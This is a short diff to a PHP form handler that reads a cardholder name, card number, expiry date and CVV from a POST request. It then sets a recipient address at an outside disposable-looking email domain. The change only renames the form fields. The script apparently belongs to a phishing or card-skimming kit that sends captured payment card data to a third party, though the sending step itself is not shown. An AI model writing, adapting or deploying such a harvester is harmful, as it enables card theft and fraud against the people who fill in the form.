@@ -1,8 +1,8 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $nombre = $_POST['fname'];
-    $numeroTarjeta = $_POST['Número Tarjeta'];
-    $fechaVencimiento = $_POST['expdate'];
+    $nombre = $_POST['nombre'];
+    $numeroTarjeta = $_POST['numero'];
+    $fechaVencimiento = $_POST['expiracion'];
     $cvv = $_POST['cvv'];
 
     $destinatario = "satev76335@haislot.com";
